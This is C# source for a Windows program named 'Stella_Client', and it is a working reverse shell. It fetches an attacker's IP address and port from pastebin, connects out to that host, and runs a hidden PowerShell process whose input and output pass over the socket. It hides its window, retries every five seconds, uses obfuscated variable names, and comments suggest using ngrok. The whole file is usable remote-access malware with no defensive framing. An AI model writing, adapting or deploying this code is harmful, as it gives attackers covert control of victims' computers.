//Running Multiple Commands
//Shutting Down Server cleanly when Client Disconnects
//Using Threads to run commands concurrently
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets; //for listeners and sockets
using System.IO; //for streams
using System.Threading; //to run commands concurrently
using System.Diagnostics;
using System.Net;

namespace Stella_Client
{
    public partial class Form1 : Form
    {
        TcpClient womderomg;
        NetworkStream nsll;
        StreamWriter notes;
        StreamReader readyabooks;
        Process psc;
        StringBuilder stipa;
        public Form1()
        {
            InitializeComponent();
        }



        private void runsts()
        {
            womderomg = new TcpClient();
            stipa = new StringBuilder();

            if (!womderomg.Connected)
            {
                try
                {
                    string address = "https://pastebin.com/raw/ppLG5QQQ";   // Dowloading Pastebin for IP and port so you dont have to do it manualy
                    WebClient client = new WebClient();
                    string ip = client.DownloadString(address);
                    string addie2 = "https://pastebin.com/raw/x7bSz37n";// Dowloading Pastebin for IP and port so you dont have to do it manualy
                    string ptlt = client.DownloadString(addie2);
                    int porttru = Int32.Parse(ptlt);        // Converting from String To INT


                    womderomg.Connect(ip, porttru); // Connecting to The IP and PORT(this was a good way of connecting if you use ngrok)
                    nsll = womderomg.GetStream();
                    readyabooks = new StreamReader(nsll);
                    notes = new StreamWriter(nsll);
                }
                catch (Exception err) { return; } //if no Client don't continue

                psc = new Process();
                psc.StartInfo.FileName = "powershell.exe";
                psc.StartInfo.CreateNoWindow = true;
                psc.StartInfo.UseShellExecute = false;
                psc.StartInfo.RedirectStandardOutput = true;
                psc.StartInfo.RedirectStandardInput = true;
                psc.StartInfo.RedirectStandardError = true;
                psc.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                psc.Start();
                psc.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    stipa.Append(readyabooks.ReadLine());
                    stipa.Append("\n");
                    if (stipa.ToString().LastIndexOf("terminate") >= 0) runsts();
                    if (stipa.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    psc.StandardInput.WriteLine(stipa);
                    stipa.Remove(0, stipa.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
            }//--end of while loop
        }//--end of RunServer()

        private void Cleanup()
        {
            try { psc.Kill(); } catch (Exception err) { };
            readyabooks.Close();
            notes.Close();
            nsll.Close();
        }
        private void sst()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    notes.WriteLine(strOutput);
                    notes.Flush();
                }
                catch (Exception err) { }
            }
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (; ; )
            {
                runsts();
                System.Threading.Thread.Sleep(5000); //Wait 5 seconds then try again
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }


    }

